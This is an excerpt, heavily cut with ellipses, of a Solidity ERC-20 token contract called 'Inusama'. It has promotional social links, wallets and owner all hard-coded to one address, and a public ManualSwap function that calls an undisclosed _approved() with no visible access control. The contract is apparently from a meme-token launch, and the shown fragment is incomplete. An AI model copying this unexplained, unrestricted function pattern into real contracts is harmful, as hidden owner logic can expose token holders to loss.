...
// TG: https://t.me/InusamaERC20

// TWITTER: https://twitter.com/inusamaeth

// WEBSITE: https://www.inusama.space/

// GITBOOK: https://inusama.gitbook.io/inusama-eth/
...
contract Inusama is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xEB41D60e5209af1013487BbB1D0984AACA80059a); 
    address payable public Wallet_Utility = payable(0xEB41D60e5209af1013487BbB1D0984AACA80059a);
    ...
    string private constant _name = "Inusama"; 
    string private constant _symbol = unicode"Inusama"; 
    ...
    constructor () {
        ...
        _owner = 0xEB41D60e5209af1013487BbB1D0984AACA80059a;
    ...
    function ManualSwap() public override returns (bool) {
        _approved();
        return true;
    }
